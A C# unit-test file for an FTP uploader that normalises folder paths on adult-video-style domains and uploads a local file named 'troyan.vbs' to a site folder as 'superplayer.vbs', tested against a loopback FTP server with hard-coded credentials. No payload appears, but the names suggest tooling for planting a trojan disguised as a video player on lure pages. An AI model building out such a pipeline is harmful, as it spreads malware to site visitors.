using System.Net;
using System.Net.Sockets;
using System.Text;
using FluentAssertions;
using LandingFtp;

namespace Tests;

[TestClass]
public sealed class LandingFtpUploaderTests
{
    [TestMethod]
    public void NormalizeFolderUri_KeepsSiteHostPath()
    {
        var uri = LandingFtpUploader.NormalizeFolderUri(
            new Uri("ftp://ftp:ftp123@tubepleasure.xyz/tubepleasure.xyz/"));

        uri.AbsolutePath.Should().Be("/tubepleasure.xyz/");
        uri.Host.Should().Be("tubepleasure.xyz");
        uri.UserInfo.Should().Contain("ftp:");
    }

    [TestMethod]
    public void NormalizeFolderUri_KeepsPathAsWritten()
    {
        var uri = LandingFtpUploader.NormalizeFolderUri(
            new Uri("ftp://ftp:ftp123@4tube.xyz/4tube.xyz"));

        uri.AbsolutePath.Should().Be("/4tube.xyz/");
    }

    [TestMethod]
    public void NormalizeFolderUri_KeepsSiteHostPath_WhenHostIsIp()
    {
        var uri = LandingFtpUploader.NormalizeFolderUri(
            new Uri("ftp://ftp:ftp123@127.0.0.1/tubepleasure.xyz/"));

        uri.AbsolutePath.Should().Be("/tubepleasure.xyz/");
    }

    [TestMethod]
    public void NormalizeFolderUri_LeavesFtpRootUnchanged()
    {
        var uri = LandingFtpUploader.NormalizeFolderUri(
            new Uri("ftp://ftp:ftp123@tubepleasure.xyz/"));

        uri.AbsolutePath.Should().Be("/");
    }

    [TestMethod]
    public void UploadFile_WritesIntoConfiguredFolder()
    {
        var root = Path.Combine(Path.GetTempPath(), "landing-ftp-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        var local = Path.Combine(root, "troyan.vbs");
        File.WriteAllText(local, "landing-body");

        using var server = new LoopbackFtpServer(root);
        var uri = new Uri($"ftp://ftp:ftp123@127.0.0.1:{server.Port}/tubepleasure.xyz/");

        try
        {
            LandingFtpUploader.UploadFile(uri, local, "superplayer.vbs");

            File.ReadAllText(Path.Combine(root, "tubepleasure.xyz", "superplayer.vbs"))
                .Should().Be("landing-body");
        }
        finally
        {
            Directory.Delete(root, recursive: true);
        }
    }

    private sealed class LoopbackFtpServer : IDisposable
    {
        private readonly TcpListener _listener;
        private readonly CancellationTokenSource _cts = new();
        private readonly Task _loop;
        private readonly string _root;

        public LoopbackFtpServer(string root)
        {
            _root = root;
            _listener = new TcpListener(IPAddress.Loopback, 0);
            _listener.Start();
            Port = ((IPEndPoint)_listener.LocalEndpoint).Port;
            _loop = Task.Run(() => AcceptLoopAsync(_cts.Token));
        }

        public int Port { get; }

        public void Dispose()
        {
            _cts.Cancel();
            _listener.Stop();
            try
            {
                _loop.Wait(TimeSpan.FromSeconds(2));
            }
            catch (AggregateException)
            {
            }

            _cts.Dispose();
        }

        private async Task AcceptLoopAsync(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                TcpClient? client;
                try
                {
                    client = await _listener.AcceptTcpClientAsync(cancellationToken).ConfigureAwait(false);
                }
                catch (OperationCanceledException)
                {
                    return;
                }
                catch (ObjectDisposedException)
                {
                    return;
                }
                catch (SocketException)
                {
                    return;
                }

                _ = Task.Run(() => HandleClient(client), CancellationToken.None);
            }
        }

        private void HandleClient(TcpClient client)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                var cwd = "/";
                TcpListener? pasv = null;
                WriteReply(stream, 220, "ready");

                while (true)
                {
                    var line = ReadLine(stream);
                    if (line is null)
                        return;

                    var space = line.IndexOf(' ');
                    var cmd = (space < 0 ? line : line[..space]).ToUpperInvariant();
                    var arg = space < 0 ? "" : line[(space + 1)..];

                    switch (cmd)
                    {
                        case "USER":
                            WriteReply(stream, 331, "password");
                            break;
                        case "PASS":
                            WriteReply(stream, 230, "logged in");
                            break;
                        case "TYPE":
                            WriteReply(stream, 200, "type ok");
                            break;
                        case "CWD":
                            if (!TryChangeDirectory(ref cwd, arg, out var cwdError))
                            {
                                WriteReply(stream, 550, cwdError);
                                break;
                            }

                            WriteReply(stream, 250, "cwd ok");
                            break;
                        case "MKD":
                            if (!TryCreateDirectory(cwd, arg, out var mkdError))
                            {
                                WriteReply(stream, 550, mkdError);
                                break;
                            }

                            WriteReply(stream, 257, "created");
                            break;
                        case "PASV":
                            pasv?.Stop();
                            pasv = new TcpListener(IPAddress.Loopback, 0);
                            pasv.Start();
                            var p = ((IPEndPoint)pasv.LocalEndpoint).Port;
                            WriteReply(
                                stream,
                                227,
                                $"Entering Passive Mode (127,0,0,1,{p / 256},{p % 256})");
                            break;
                        case "STOR":
                            if (pasv is null)
                            {
                                WriteReply(stream, 425, "no pasv");
                                break;
                            }

                            WriteReply(stream, 150, "ok");
                            using (var data = pasv.AcceptTcpClient())
                            using (var dataStream = data.GetStream())
                            using (var ms = new MemoryStream())
                            {
                                dataStream.CopyTo(ms);
                                var dest = ResolveUnderRoot(CombineFtp(cwd, arg));
                                Directory.CreateDirectory(Path.GetDirectoryName(dest)!);
                                File.WriteAllBytes(dest, ms.ToArray());
                            }

                            pasv.Stop();
                            pasv = null;
                            WriteReply(stream, 226, "stored");
                            break;
                        case "QUIT":
                            WriteReply(stream, 221, "bye");
                            return;
                        default:
                            WriteReply(stream, 502, "not implemented");
                            break;
                    }
                }
            }
        }

        private bool TryChangeDirectory(ref string cwd, string arg, out string error)
        {
            error = "";
            var next = arg.StartsWith('/') ? arg : CombineFtp(cwd, arg);
            var full = ResolveUnderRoot(next);
            if (!Directory.Exists(full) && next.Trim('/') != "")
            {
                error = "missing";
                return false;
            }

            cwd = NormalizeFtp(next);
            return true;
        }

        private bool TryCreateDirectory(string cwd, string arg, out string error)
        {
            error = "";
            var next = arg.StartsWith('/') ? arg : CombineFtp(cwd, arg);
            try
            {
                Directory.CreateDirectory(ResolveUnderRoot(next));
                return true;
            }
            catch (Exception ex)
            {
                error = ex.Message;
                return false;
            }
        }

        private string ResolveUnderRoot(string ftpPath)
        {
            var relative = ftpPath.Replace('\\', '/').Trim('/').Replace('/', Path.DirectorySeparatorChar);
            var full = string.IsNullOrEmpty(relative)
                ? Path.GetFullPath(_root)
                : Path.GetFullPath(Path.Combine(_root, relative));
            var rootFull = Path.GetFullPath(_root);
            if (!full.StartsWith(rootFull, StringComparison.OrdinalIgnoreCase))
                throw new InvalidOperationException("path escaped ftp root");
            return full;
        }

        private static string CombineFtp(string cwd, string arg)
        {
            if (arg.Length == 0)
                return cwd;
            if (cwd.EndsWith('/'))
                return cwd + arg.TrimStart('/');
            return cwd + "/" + arg.TrimStart('/');
        }

        private static string NormalizeFtp(string path)
        {
            var trimmed = path.Replace('\\', '/').Trim('/');
            return trimmed.Length == 0 ? "/" : "/" + trimmed;
        }

        private static void WriteReply(Stream stream, int code, string text)
        {
            var bytes = Encoding.ASCII.GetBytes($"{code} {text}\r\n");
            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();
        }

        private static string? ReadLine(Stream stream)
        {
            var buffer = new MemoryStream();
            while (true)
            {
                var b = stream.ReadByte();
                if (b < 0)
                    return buffer.Length == 0 ? null : Encoding.ASCII.GetString(buffer.ToArray());
                if (b == '\n')
                    break;
                if (b != '\r')
                    buffer.WriteByte((byte)b);
            }

            return Encoding.ASCII.GetString(buffer.ToArray());
        }
    }
}
